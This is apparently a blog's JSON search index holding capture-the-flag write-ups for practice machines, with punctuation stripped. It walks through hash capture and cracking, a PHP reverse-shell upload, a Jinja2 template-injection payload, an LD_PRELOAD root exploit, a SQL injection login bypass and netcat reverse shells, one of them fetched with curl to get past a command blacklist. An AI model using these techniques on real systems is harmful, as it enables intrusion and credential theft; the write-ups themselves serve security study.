machine because it is much quicker than doing it on a VM  Eventually  the hash will be cracked revealing that the password to the Administrator account is Ticketmaster1968  Now we can get a SYSTEM shell on the box with yet another impacket python script  psexec py  have I mentioned how cool impacket is    Using this script did not work for the SVC  TGS user  because we did not have write access to the ADMIN  directory  Now as the Administrator  we have write access to ADMIN  which will let us create a named pipe to the PSExec service  which will allow us to directly send commands as NT AUTHORITY  SYSTEM  the highest privileged Windows user  You can read more about PSExec here   PSExec Demystified  https   www google com url q https   blog rapid7 com 2013 03 09 psexec demystified  sa D source editors ust 1653954214361817 usg AOvVaw21QM1DHdhhuz mFj80 gRV   reports Active image2 png  reports Active image18 png And that was the box  I learned a lot about the Windows Active Directory and Kerberos authentication thanks to the creators  eks and  mrb3n  Active Directory  AD  is getting replaced with Azure Active Directory  Azure AD   Azure AD relies more on the usage of cloud computing  and is considered to be a more secure implementation of the AD service  Microsoft has a very detailed document regarding this topic   Compare Active Directory to Azure Active Directory  https   www google com url q https   docs microsoft com en us azure active directory fundamentals active directory compare azure ad to ad sa D source editors ust 1653954214362766 usg AOvVaw1KGUaMO6bR3ZRGhZ0c0e27   Anyways  I hope you all enjoyed the box as much as I did  and that this writeup helped not only to deepen the knowledge which you gained from this box  but also showed you some things that you may have not considered or not known  See you in the next writeup",
      "image": "/images/Active.png"
    } ,
  
    {
      "title"    : "Bastion Writeup",
      "category" : "",
      "tags"     : "",
      "url"      : "/2021/02/27/Bastion-Writeup/",
      "date"     : "Feb 27, 2021",
      "content"  : "layout  posttitle   Bastion Writeupdescription  A very realistic box with many things to learn  Misconfigurations can be a dealbreaker when it comes to a certain attack vector  There has always been a conflict between security and convenience  and this box highlights it  I go very in depth about multiple aspects in this box relating to bastion hosts and credential databases  I hope you learn as much from this writeup as I did from this challenge date    2021 02 27image     images 0xd4y logo gray png tags     SMB  NTLM RelayThis report can be read both on this site  and as its  a href    https   0xd4y.com reports Writer 20Writeup pdf  original report form  a   It is highly recommended that you read the original report form instead because it is better formatted reports Bastion image12 png  reports Bastion image21 png This was an amazing box that really showed the importance of using google  It was unique in that it did not have a web server port  The great thing about this box is that it was very realistic  as intended by the author L4mpje  Let s get right into itAs usual  I added the ip to my  etc hosts file and called it bastion htb  Afterwards  I ran the normal nmap  sC  sV  oA nmap nmap bastion htb which revealed many ports  Just to be sure that I had all the ports  I ran nmap  p    max retries 0 bastion htb  Note the max retries flag which  when set to 0  performs the scan at it s quickest but most unreliable speed  This is because the max retries flag is used to specify the maximum port scan probe retransmissions  and the less transmissions you send  the higher likelihood that you will have false negatives and positives  After scanning all ports  the following ports were revealed  47001 49664 49665 49666 49667 49668 49669 49670  Due to this  I ran the thorough nmap scan once again  this time specifying the ports   nmap  sC  sV  oA nmap nmap  p 22 135 139 445 5985 47001 49664 49665 49666 49667 49668 49669 49670 bastion htb reports Bastion image4 png Looks like the high ports that the nmap  p  command found were of no importance  Looking at the results however  two ports in particular stand out  This Windows box is running ssh   That s certainly strange as I have not seen any other Windows box with ssh  more on this later   The other port that stands out is port 445  Samba a k a SMB which stands for Server Message Block   and it is configured to allow guest access  This seems like the most obvious attack vector  so let s see what we findsmbmap  H bastion htb  u guest reports Bastion image3 png Again  two things in this output stand out  First of all  there is a Backups directory which we have READ and WRITE access to  The fact that we have WRITE access to this is a huge red flag  This means that we could drop a malicious SCF  shell command file  to potentially steal hashes from users who access this file  We can write a  scf file with the following contentsShellCommand 2IconFile     10 13 37 2  share  0xd4y icoTaskbarCommand ToggleDesktopWhenever a user browses to this file  Windows will attempt to authenticate to our share with the credentials of the user  meaning that we can capture these credentials  albeit the password is hashed   The fact that we have write access to a directory containing backups is especially alarming  as which users would normally access such a directory  Probably domain admins  There is an excellent article on this topic that I highly recommend you read   https   pentestlab blog 2017 12 13 smb share scf file attacks   https   www google com url q https   pentestlab blog 2017 12 13 smb share scf file attacks  sa D source editors ust 1653959269091618 usg AOvVaw0pGdwROOMk11BRZjNFPYMF    Anyways  this is most likely not intended by the author because Bastion is an easy box and there are no real users on the system to execute the  scf file  as this is just a box rather than a real attackThe other thing that stands out is this smbmap message   Work      Unable to remove test directory at     bastion htb  Backups  GZHGUJOWDT  please remove manuallyThe smbmap tool knows that we have write access to   Backups because it was able to write to it  However  the fact that it was not able to remove it shows that this created directory could be a way for defenders to find out that someone may be up to something malicious  In a real penetration testing environment  it may be more wise to use smbclient  L  U guest bastion htb which lists the shares  but does not list the permissions reports Bastion image17 png Ok  enough stalling  Let s just see what s inside this   Backups directory  I created a  smb directory on my machine  so that if I download a file it goes straight to the  smb directory  and connected to the SMB sharesmbclient  U guest   bastion htb Backups reports Bastion image6 png I downloaded the note txt file using get note txt and viewed it on my host machine reports Bastion image20 png This file is a hint that there is probably a large backup file somewhere in this SMB share  Let s keep enumerating  Eventually you ll find the following directory reports Bastion image14 png Incidentally  we know that there is probably a user named L4mpje on the system  it is always important to save information like this in a file where you keep your notes   Two files here stand out  first there were two ports that stood out  then two interesting things with the SMB share  now this   why are there always two things that stand out     The  vhd  virtual hard disk  files are quite conspicuous  these files are absolutely massive  One is about 37MB while the other one is 5 4GB and are no doubt the backup files that the note txt message was referring to  I foolishly downloaded both files and inspected them when I was first going through this machine  so let s see how to view these files without waiting a million years for them to finish installingThe mount command does the trick  Running the command sudo mount  t cifs   bastion htb Backups smb   o username guest we see the full listing of the directory Backups  The   t option for mount specifies the type of file share we want to mount  CIFS stands for Common Internet File System and is a dialect  or particular implementation  of the SMB protocol reports Bastion image10 png Note the strange directory names that smbmap created  Anyways  let s get right to the  vhd files reports Bastion image15 png When I was first going through this box  I mounted both the  vhd files  but the 37MB one is not interesting as it just has boot files  Let s mount the  vhd file and inspect its contentsguestmount  a 9b9cfbc4 369e 11e9 a17c 806e6f6e6963 vhd  m  dev sda1   ro   business hackthebox easy windows bastion mnt reports Bastion image2 png And we get a whole listing of files  At this point  I looked through a ton of data  but I couldn t find anything interesting laying around  However  there is still a way to extract credentials due to a huge oversight of the sysadmins  They accidentally backed up the files SYSTEM and SAM  Security Account Manager  located in  Windows System32 config reports Bastion image16 png So the note really wasn t kidding when it said to not transfer the entire backup file locally  A lazy sysadmin did not realize that he backed up even the SAM and SYSTEM file  THESE FILES ARE HIGHLY SENSITIVE    The SAM file is a database file that stores credentials of the local users  These credentials are hashed and encrypted by the system boot key which is located in SYSTEM  This means that if you have access to the SYSTEM file  then you can decrypt the credentials revealing their hashesWe can use the impacket secretsdump tool to extract hashed credentials  Let s copy these files to our root directory   bastion  and continue with the commandimpacket secretsdump  sam SAM  system SYSTEM local reports Bastion image11 png Well  now we have the hash for the L4mpje user  Notice how Administrator and Guest have blank LM and NTLM hashes  This indicates that Administrator and Guest were most likely disabled when this file was backed up  even more evidence that this was probably backed up with the SYSTEM user   but this could be an old backup file and Administrator could have been activated since then  Anyways  let s copy the NTLM hash of L4mpje and crack ithashcat  m 1000 26112010952d963c8dc4217daec986d9  usr share wordlists rockyou txtAfter about a minute  the NTLM hash is cracked revealing that L4mpje s password is bureaulampjeTipUsing Hashcat on a virtual machine is not recommended  Hashcat runs a lot quicker on   your host machineLet s ssh into the box and hope that L4mpje has not updated his password since the  vhd file was backed up reports Bastion image5 png It was expected that L4mpje did not change his password  Not because this is meant to be a vulnerable machine  but this is completely realistic  How often does a person change his passwordWe can now grab user txt  but how are we going to escalate to administrator  This is where having knowledge on the basic file system of Windows is useful  After a lot of enumeration  you will notice that there is a particular directory on this box which stands out on C   Program Files  x86 reports Bastion image9 png The mRemoteNG directory is not part of the default Windows build  Let s inspect it further reports Bastion image7 png Nothing in this directory looks out of the ordinary  In any case  we should look into this for multiple reasons1   mRemoteNG is a tool for connecting and managing remote systems  protocols such as SSH  RDP  etc  are used2   mRemoteNG is not part of the default Windows build 3   This box is called Bastion  hinting at the possibility that this box is a bastion host  A bastion host allows external connections to a private network  Due to the increased probability of an attack on a bastion host  it must be hardened to withstand such attacks  As such  typically there are very few services running on a bastion host  in our case the bastion host is running SSH and an SMB share   Ideally  a bastion host acts as a jump server once a connection has been established to it  a jump server is used to access devices in a separate security zone   Essentially  this means after connecting to a bastion host  authorized users can have access to private instances located within the virtual private cloud  VPC  Think of a bastion host as a bastion is in real life  hence the name   You can walk up to the bastion  knock on the castle walls  but you are not allowed inside unless you are authorized  If you attack the bastion  you may be met with defensive fireBLACKLISTED reports Bastion image1 png After a bit of googling  you will find a great article explaining the insecurity of mRemoteNG   https   hackersvanguard com mremoteng insecure password storage   https   www google com url q https   hackersvanguard com mremoteng insecure password storage  sa D source editors ust 1653959269099144 usg AOvVaw3 pbufm1UKT3DrQduFTOtr    The ConfCons xml file located in  AppData   mRemoteNG contains encrypted passwords for users on the system  Let s reveal the contents reports Bastion image8 png This password seems to simply just be base64 encoded  but when we decode it  we just get garbage reports Bastion image18 png This suggests that the password is most likely encrypted  Luckily  there are many different ways to decrypt mRemoteNG passwords  I used this tool on github   https   github com kmahyyg mremoteng decrypt  https   www google com url q https   github com kmahyyg mremoteng decrypt sa D source editors ust 1653959269099982 usg AOvVaw025QHY47XDkVrWrOY0p2APUsing this tool and inputting the encrypted password of Administrator we get the credentials reports Bastion image13 png We can now ssh into Administrator and get root txt reports Bastion image19 png There were many things learned in this box  I really appreciate the work L4mpje did on creating this challenge  It was completely realistic  and I loved it beginning to end  Thanks also to you for reading my writeup  and I hope you learned from this box as much as I did",
      "image": "/images/Bastion.png"
    } ,
  
    {
      "title"    : "Bank Writeup",
      "category" : "",
      "tags"     : "",
      "url"      : "/2021/02/21/Bank-Writeup/",
      "date"     : "Feb 21, 2021",
      "content"  : "layout  posttitle   Bank Writeupdescription  This is a really cool box that has a couple of interesting twists  I go through the unintended solution  the way I went about the machine  and the intended solution  There is a lot to learn here about web security and networking  and I highly encourage you to read this writeup date    2021 02 21 image     images 0xd4y logo gray png tags     Open Redirect  RCEThis report can be read both on this site  and as its  a href    https   0xd4y.com reports Writer 20Writeup pdf  original report form  a   It is highly recommended that you read the original report form instead because it is better formatted reports Bank image5 png  reports Bank image3 png Never underestimate the power of BurpSuite  In this box  I will go through the unintended and intended solution  There is a lot to learn in the unintended solution  and this is actually how I went about rooting the box  After I show you the unintended solution  I will demonstrate how the author of the box   makelarisjr  intended to go about rooting the machineAs always  we will enumerate the ports with nmap  sC  sV oA nmap nmap 10 10 10 29 reports Bank image7 png Immediately  something unusual strikes us  Port 53  the port for DNS  is running on the TCP protocol  Typically  this runs on UDP  because UDP is faster and DNS does not need to handle large requests  The only reason why this port would be run on TCP is perhaps for zone transferring reports Bank image26 png Now as a habit  before I go onto trying to get root  I like to add the ip of the box to my  etc hosts file  That way  I don t have to memorize the ip of the machine reports Bank image18 png Before we go to the web server  let s enumerate the subdomains with the dig command reports Bank image12 png The AXFR protocol is typically used in conjunction with TCP  Cool  Let s add the subdomains to our  etc hosts file reports Bank image33 png Unfortunately  all of these subdomains  except for bank htb  seem to be a rabbit hole  When I visited chris bank htb  ns bank htb  and www bank htb  I was met with the following default ubuntu page reports Bank image30 png This same page appeared when I went to 10 10 10 29  Running a gobuster scan on all of these pages didn t reveal anything interesting  However  bank htb presented me with this login page reports Bank image10 png I tried to see if this login page was vulnerable to SQL injection  but I couldn t find any vulnerabilities  After enumerating the directories with gobuster  I found the following reports Bank image28 png The 302 status code is a redirection  This is why when I visited  support php  I was redirected to  login php  However  let s see if this redirection was configured properly  A quick test for this is to curl the directory and pipe it to wc  ccurl http   bank htb support php wc  cWe see that the response returns 3861 characters  This is very odd  as typically redirect pages don t contain more than a couple hundred characters  Let s see what happens if we look at this through burp  Make sure to intercept server responses in the  Options  tab under  Proxy reports Bank image1 png Let s intercept our request when going on http   bank htb support php reports Bank image4 png After forwarding this request  we intercept the server response which is quite long with html tags  indicating that it is displaying a webpage reports Bank image31 png As expected  we get a 302 Found response  Note how we can view the source of  support php  As you can probably deduce  this is a vulnerability in itself  This means that we don t need to authenticate in order to view this page  Changing 302 Found to 200 OK and forwarding this request  we can now interact with the support php page reports Bank image13 png Here you can try to upload an image file  php file  or whatever you d like  As it turns out  the webpage only allows image files  Eventually  you ll find that you cannot upload a reverse shell  due to file restrictions  without knowing a particular secret  That secret lies in a comment embedded in the source code  always check the source code reports Bank image16 png Uploading a php reverse shell with the extension of htb instead of php should do the trick  I used the reverse shell from pentestmonkey which you can find by visiting the following link   https   github com pentestmonkey php reverse shell  https   www google com url q https   github com pentestmonkey php reverse shell sa D source editors ust 1653958332694174 usg AOvVaw0gEEdKo pDQeFwuDAFt ygChanging the php reverse shell php to php reverse shell htb allows us to upload the shell successfully  Visiting  http   bank htb uploads reverse  shell htb  https   www google com url q http   bank htb uploads reverse shell htb sa D source editors ust 1653958332694734 usg AOvVaw1wapbxBfFbOzX3EwJx7SwX  gets us a reverse shell reports Bank image11 png  reports Bank image19 png As www data  we can read the user txt file in  home chris   Now let s get root txtThe first thing I always do when getting a reverse shell is sudo  l and groups  Nothing was out of the ordinary  so I went to do the next thing that I always do  I set up a python http server on my machine hosting linpeas sh  then on the reverse shell I went to the  tmp directory  downloaded the linpeas sh file  and ran it  you can find linpeas using the following link   https   github com carlospolop privilege escalation awesome scripts suite  https   www google com url q https   github com carlospolop privilege escalation awesome scripts suite sa D source editors ust 1653958332695769 usg AOvVaw1MOcd4iGwIozIAy 2spgF6    After running linpeas  the first thing I do is skim the output for anything that is highlighted in yellow with red text  this indicates a high chance of a privilege escalation vector   If linpeas doesn t find anything completely out of the ordinary  I look through the output more closely  For this box  there was no need to look any further as a critical vulnerability was found reports Bank image29 png We have write access to  etc passwd  If we create a user with id 0 in the  etc passwd file  then we will be root  The first thing to do is to create a unix crypt password  the password hash used for linux systems   and put this in the  etc passwd file corresponding to a user that we create reports Bank image25 png This is the  etc passwd file before editing reports Bank image32 png This is the  etc passwd file after editing reports Bank image34 png Now we can su to 0xd4y  the user that we created  with the password of password reports Bank image27 png Incidentally  I could have also just changed the root password by replacing the  x of the root entry with the password hash  This works because  etc passwd takes precedence over  etc shadow  Additionally  adding a new user with id 0 also works because Unix systems identify users by their id  not by their username  This was a very fun box and really highlighted the power of BurpSuite  However  as it turns out  this way of rooting the box was unintended  So let s go through the way that the author intendedIntended SolutionAs it turns out  when running a gobuster scan on  http   bank htb  https   www google com url q http   bank htb sa D source editors ust 1653958332697464 usg AOvVaw1HXJjloI3LGver3kWPOIXQ   there was a directory  balance transfer   my scan did not find this and I have no idea what wordlist would even have this entry   Visiting the page we are just flooded with files reports Bank image22 png Clicking on one of the files reveals the following reports Bank image8 png I tried base64 decoding these parameters  but it was just a nonsensical output due to the encryption  So  I recursively downloaded all the files in this directory with wget  r  http   bank htb balance transfer   https   www google com url q http   bank htb balance transfer  sa D source editors ust 1653958332698299 usg AOvVaw1es7j4P8cUpJhLx9QTm6AE  in order to inspect these files further on my machine  I assumed since this is a CTF  there is probably a file in this big mess that is different  I checked the Full Name parameter of each file to see if there was something different in one of the files using grep Name  rThis command lists the Full Name parameter in all the files in the directory  After doing this I noticed a pattern  Each encrypted full name is 128 characters in length  I isolated each full name by using the tr command reports Bank image9 png Now we have Full Name  the encrypted full name  and the file path on different lines  We are only interested in the encrypted name and the file path for now  so let s do a grep  v on  Full Name   So far our entire command looks like this  grep Name  r   tr        n  grep  v NameNow we have a bunch of strings that are 128 characters in length  so let s do a grep  v on any string that s more than 120 characters  I arbitrarily chose this number  you could have chosen whatever number suits you as long as it isn t too small and not more than 128   After grepping out the 128 character length strings  my terminal was now only flooded by the path of each file reports Bank image2 png Finally  let s do a grep  v on  acc  to get rid of the flooding of those file paths  After doing all of this we get the following output reports Bank image17 png Interesting  There must be a file somewhere in this directory with the full name of Chris Christopoulos  Let s grep for this specific string in the directory to find the file containing this string reports Bank image6 png  reports Bank image23 png These aren t the ssh credentials for chris  so let s use these credentials on  login php reports Bank image20 png  We are greeted with a nice dashboard and an interesting balance  There is nothing out of the ordinary to be seen here  The real vulnerability lies in the support php directory  so let s visit that reports Bank image15 png Well  that looks a lot nicer than what we saw in Burp  I will skip the methodology of getting the reverse shell  as I already covered this in the unintended solution aboveA very common way to escalate privileges is by abusing setuid binaries  This can be viewed using the find    perm  4000 2  dev null  command  Using this  we find the following binaries reports Bank image24 png One setuid binary in particular stands out   var htb bin emergency  Let s just run it and see what happens reports Bank image14 png  reports Bank image21 png BonusWhen I was first doing this box  I actually did not know about the trick of intercepting a server response and modifying it to allow unauthorized access to a page  Instead  I curled  http   bank htb support php  https   www google com url q http   bank htb support php sa D source editors ust 1653958332701455 usg AOvVaw3mPbt5yUpdAMfy7vs2jdXx  to find all the parameters needed to create a python script which automatically uploads a file of your choice  You can check out the script here   https   github com 0xd4y WriteUps blob gh pages HackTheBox bank  upload py  https   www google com url q https   github com 0xd4y WriteUps blob gh pages HackTheBox bank upload py sa D source editors ust 1653958332701929 usg AOvVaw2vwKphjcxIghPRvkCWoMPwThanks for reading this writeup  I hope you learned something new  Have a wonderful day and best of luck on your journey in cybersecurity",
      "image": "/images/Bank.png"
    } ,
  
    {
      "title"    : "Keldagrim Writeup",
      "category" : "",
      "tags"     : "",
      "url"      : "/2021/02/05/Keldagrim-Writeup/",
      "date"     : "Feb 5, 2021",
      "content"  : "layout  posttitle   Keldagrim Writeupdescription  A realistic box  Many things were learned during this challenge  and I highly recommend reading this writeup date    2021 02 05 image     images 0xd4y logo gray png tags     Python  SSTIThis report can be read both on this site  and as its  a href    https   0xd4y.com reports Keldagrim 20Writeup pdf  original report form  a   It is highly recommended that you read the original report form instead because it is better formattedThis box was rated as a medium difficulty by TryHackMe  This was a great box in the sense that the attacker did not have to get lucky by brute forcing a directory or password  Instead  the vulnerability came from connecting dots and researching  That being said  let s get right into the boxEnumerating the ports  we find that only ports 22 and 80 are open reports Keldagrim image2 png Looking at the results we don t find anything out of the ordinary  except for the httponly flag not being set  Let s just check out the website and see what we find reports Keldagrim image12 png xt file  We are met with a very simple page with a couple of directories  On the  Our Team  tab we find two possible users  Jed and Jad  This may or may not be useful later on  so I made sure to add this to my notes txt file  Looking around we click on the  Buy Gold  tab and we see an interesting Admin option reports Keldagrim image1 png Unfortunately the admin option is grayed out  I couldn t find anything more useful in this so let s use our trusty tool  Burpsuite  I captured a request to the  team directory and saw a couple of very strange things reports Keldagrim image10 png First of all  there is a session cookie which is encoded in base64  Decoding this  we see that Z3Vlc3Q  is the base64 encode of guest  When base64 encoding the string  admin   YWRtaW4   and pasting that into the session cookie  we see that the content length changes  Let s use the developer tools  paste this base64 string in the session value  and reload the page reports Keldagrim image5 png And we are now the admin  Unfortunately  there is not much that has changed except for the strange  sales  cookie which is also base64 encoded  Decoding this  we see that it corresponds to the  2 165 we see on the screen  At this point  I was stuck for a long time  but at the back of my mind was this strange server in one of my requests to the page with all the packages to be bought reports Keldagrim image13 png Server  Werkzeug 1 0 1 Python 3 6 9This is what comes to mind  Seeing Werkzeug and python brings to mind that maybe Flask has something to do with this  After a lot of research  it seemed that this box might be vulnerable to SSTI  Server Side Template Injection   I came across a great article on this topic  which explained very well on how this vulnerability is exploited   https   medium com  nyomanpradipta120 ssti in flask jinja2 20b068fdaeee  https   www google com url q https   medium com  nyomanpradipta120 ssti in flask jinja2 20b068fdaeee sa D source editors ust 1653954534767158 usg AOvVaw3cO1ZM3W9Fe ZTh2QettjHTL DR you can get code execution through abusing flask  Proof of concept reports Keldagrim image9 png  reports Keldagrim image4 png As we can see  the server evaluated 7  7 which is 49  You must find the subprocess Popen under the  object  class with which you will get code execution  After viewing all the sub processes within the object class  I grepped the Popen subprocess to find at which index it is located  After discovering that it was at the 402nd location  the final payload looks like the following     class         mro      1       subclasses        401    ls  shell True stdout  1  communicate    Now that we have code execution  let s get a reverse shell reports Keldagrim image3 png There is user txt  One of the first things I run when getting a reverse shell is sudo  l reports Keldagrim image8 png Unfortunately  getting root won t be as easy as just looking up  bin ps on gtfobins  Fortunately  however getting root is easy nonetheless  The env  keep  LD  PRELOAD is particularly strange  Looking this up  I came across an article that explained how to exploit this   https   www hackingarticles in linux privilege escalation using ld  preload   https   www google com url q https   www hackingarticles in linux privilege escalation using ld preload  sa D source editors ust 1653954534768244 usg AOvVaw0snkjC96zCdV2nbDP5tsbGEssentially  we want to create a shared object that will be run as root as part of the LD  PRELOAD environment  As a result  the actual function for  bin ps will be overridden by our own binary  Using this fact  we can create a shell as root  We must compile the code below as a shared object and add it to the LD  PRELOAD environment123456789include  stdio hinclude  sys types hinclude  stdlib hvoid   initunsetenv  LD  PRELOADsetgid 0setuid 0system   bin shI saved the code below as exploit c and compiled it with the following commandscd  tmpgcc  fPIC  shared  o shell so exploit c  nostartfilessudo LD  PRELOAD  tmp shell so ps reports Keldagrim image6 png BONUSI ran nikto on this website  and it found an interesting vulnerability reports Keldagrim image7 png According to nikto  the site is vulnerability to HTML injection so let s try it out using the payload they suggestts2s1NMDd1VJtKSBRcn82Yzs6CMY1u42RDsdfO6lT8XQ4d2wnexQKAEmtizMPNHTnyEq2tGZFhuZFztIsW0KFFesXGzcEkCmWUYaq4CFDSQLzsu2gpT6eeKTFGHIDulc5a6layCW57JZyywP1ULTbIaz1LScDK6V74lsCTy8jH6z49h4spfFApiSynzRB18unriHDFcu1O9DivFGpMyUrxCsBPOLZQ0 font 20size 50 reports Keldagrim image11 png As can be seen  the font size has increased to a ridiculous size  This confirms the HTMLvulnerability  This vulnerability is not critical in the context of this box  as no other users will be using the exact same instance  However  in the case that this website were to be visited by many other users  the attacker can possibly steal their credentials by using a phishing attack  They can create a page for the victim to enter their username and password  and this information will be sent back to the attackerThis was a great box  and I thank the creator  optional for creating such a fun challenge  Thanks for reading this writeup  I hope you learned as much from this box as I did  I wish you a wonderful day  or night",
      "image": "/images/keldagrim.png"
    } ,
  
    {
      "title"    : "Avengers Writeup",
      "category" : "",
      "tags"     : "",
      "url"      : "/2021/01/21/Avengers-Writeup/",
      "date"     : "Jan 21, 2021",
      "content"  : "layout  posttitle   Avengers Writeupdescription  A fun CTF like box with an easter egg and cool  unintended  foothold  I root this box in a quite unique way  which the author of the box certainly did not intend date    2021 08 22 image     images 0xd4y logo gray png tags     SQLi  RCE  Bash InjectionThis report can be read both on this site  and as its  a href    https   0xd4y.com reports Avengers 20Writeup pdf  original report form  a   It is highly recommended that you read the original report form instead because it is better formattedThis was an interesting room from TryHackMe that taught basic SQLi injection  It was structured in a CTF format in which the student would achieve each flag from solving a task  more on this later   Although this box was structured in a way to guide the student  I like to try to complete the box without the hints provided by the questions  and rather than taking you through how to complete each task in sequential order as the author intended  I will explain how I went through this box  As a result  I went the extra mile when completing this box without realizing it  After completing this box  I read many write ups but not one mentioned the secret flag  and more interestingly  no write ups rooted the box  I only found out later that the author of this box did not intend for the student to root the box   perhaps the author did not realize how the RCE vulnerability could be exploited     We will explore this more in detail further in this writeupAs usual we will enumerate the machine with nmap  sC  sV  oA nmap nmap  victim ip   This may take a while so I have already ran it   ok I m not ippsec  Anyways  looking at the results we see the following reports Avengers image14 png Right off the bat we know this machine is running Ubuntu  All the services are up to date  during the time of writing which is Jan 2021Let s take a look at the http serverLooking at the root page  we see a lot of comments by many avengers  but one in particular stands out reports Avengers image13 png Now this is an interesting comment that should be kept in mind  Before I started playing around with this website  I enumerated the directories of this http server with gobuster  always have some kind of enum going on in the backgroundgobuster dir  u http    victim ip   w  wordlist   o  output  fileI highly recommend checking out https   github com danielmiessler SecLists   as there are a lot of useful wordlists that you can use to bruteforce directories  passwords  and usernames  For this box I used the raft small words txt wordlistWhile enumerating the directories  I looked at the source code for this html page and saw the following at the bottom reports Avengers image2 png Clicking on this script  we get the first flag  As a habit  you should look at the html source code  as it might leak some valuable informationLooking at the gobuster results we see that  portal is an interesting directory  Going to this page we see the following reports Avengers image15 png Looking at the html source code  see a pattern here   we see an interesting comment reports Avengers image4 png SQLi stands for SQL injection and is a common problem that can have disastrous results in web servers  Thankfully  this vulnerability has been getting more publicized  and the frequency of successful attacks related to SQLi are decreasingTyping   OR 1 1     in the username and password  we get in reports Avengers image1 png So   the developer though it would be a good idea to allow users to directly interact with the server through commands  Too easy  let s try an easy reverse shell using pentestmonkey   http   pentestmonkey net cheat sheet shells reverse shell cheat sheet  https   www google com url q http   pentestmonkey net cheat sheet shells reverse shell cheat sheet sa D source editors ust 1653956340026229 usg AOvVaw0wtnc8W3CDqlI9 pZsUQ9EOn the attacker machinenc  lvnp  attacker portOn the Jarvis command linerm  tmp f mkfifo  tmp f cat  tmp f  bin sh  i 2  1 nc  attacker ip   attacker port    tmp fUnfortunately  when we run this we receive an error message reports Avengers image16 png So let s just stick with harmless commands such as ls and cd so that we look around the files of this server  Let s see which files are in the directory we are inJarvis commandlsResultscreate sqlnode  modulespackage lock jsonpackage jsonserver jsviewsJarvis commandcd    lsResultsavengersflag5 txtAfter looking around we find the fifth flag  at this point I guessed I was supposed to find at least four flags by now   Cool  let s see the contentscat    flag5 txtAnd we get hit with the same  Command disallowed  error that we got when we tried creating a reverse shell  I immediately started thinking of commands similar to cat such as head and tail  but neither worked  Eventually  I tried less which successfully revealed the contents of the fifth flagNow at this point  I didn t know that I wasn t supposed to go any further so I kept thinking of ways on how I would get a reverse shell  I tried many commands such as curl  bash  nc  perl  python  and many more commands  I was thinking about how it was possible to get a reverse shell without specifically typing any of these blacklisted strings  I came to the conclusion that if I could echo a string to a text file  and then somehow prepend text to it  then I could create a file that would contain a malicious command  Here is the methodologyecho  url  attacker ip  rev  o  tmp reverse  shell     tmp malicious  commandsed  i  1s   cu    tmp test       prepends the characters cu to  tmp malicious  commandchmod  x  tmp malicious  commandContent of  tmp malicious  commandcurl  attacker ip  rev  o  tmp revThen  executing  tmp rev would call the curl command make our malicious file be downloaded to the  tmp directoryLet s try this outless  tmp malicious  command reports Avengers image9 png Awesome  Let s set up a python http server on port 80 with a file called rev  This file can now hold the blacklist nc string as it is not being written to the Jarvis Command LineYou can try many different reverse shells but I find this particular one to be the most reliablerm  tmp f mkfifo  tmp f cat  tmp f  bin sh  i 2  1 nc  attacker ip   attacker port    tmp fRunning sudo python3  m http server 80 and executing  tmp malicious  command we get a hitLooking at the content of  tmp we see these files now reports Avengers image17 png Now on our machine let s listen to the port that we specified in the reverse shell commandJarvis commandschmod  x  tmp rev   tmp revAnd we get a reverse shell reports Avengers image3 png No need to privesc  We are already root because the server was running as root  Now this is a huge vulnerability that is not too uncommon  NEVER RUN YOUR WEB SERVERS AS ROOT  It is better to run a web server as a low privileged user such as www data in case of any web vulnerabilities  So anyways  now that we have root I d call the box done  Let s just get the flags straight from the terminalfind   2  dev null grep  i flag grep  i  txt reports Avengers image11 png grep  r flag2  home reports Avengers image12 png For task 6 view the html source code and scroll to the bottom  On the very left side of the screen is the number of lines of code reports Avengers image6 png So these are all the flags that the author wanted us to find when he published the room  but let s find the secret flag  something I stumbled on accidentally   I was curious on looking at the source code of the Jarvis command line to see which strings in particular are blacklisted  We strike a goldmine in  home ubuntu avengers server js reports Avengers image5 png Now that explains why a lot of the commands we wanted did not work  Let s see what else this file has to offer reports Avengers image10 png We get credentials to the mysql server of this box  Now that saves a lot of time trying to reset the credentials  Let s check it out reports Avengers image8 png  reports Avengers image7 png And we get the secret flagflag4 sanitize  queries  mr  starkLooking at the SQL source code of the site  also located in  home ubuntu avengers server js  we see why the website was vulnerable to the SQLi reports Avengers image18 png The following line is particularly interestingMade deliberately vulnerable   Changed from con query  SELECT    FROM users WHERE   username     AND password         username  password            con query  SELECT    FROM users WHERE username       username     AND password       password  function error  results  fields   When we wrote   OR 1 1       the line looked like thiscon query  SELECT    FROM users WHERE username     OR 1 1       username     AND password       password  function error  results  fieldsNote how the rest of the query is commented out using the dashes       Essentially  the server was looking for a person whose username is blank  or true  Now nobody in the http server had a blank name so that would run false  However the OR statement is key  A false statement  ORed  with a true statement makes the statement true as a whole  For this reason  the login query ran true giving us accessOverall  this was a very fun box with an interesting and unique way of rooting  although I don t think it was intended   This is my first writeup  and I hope you enjoyed reading it",
      "image": "/images/avengers.png"
    } 
  
]
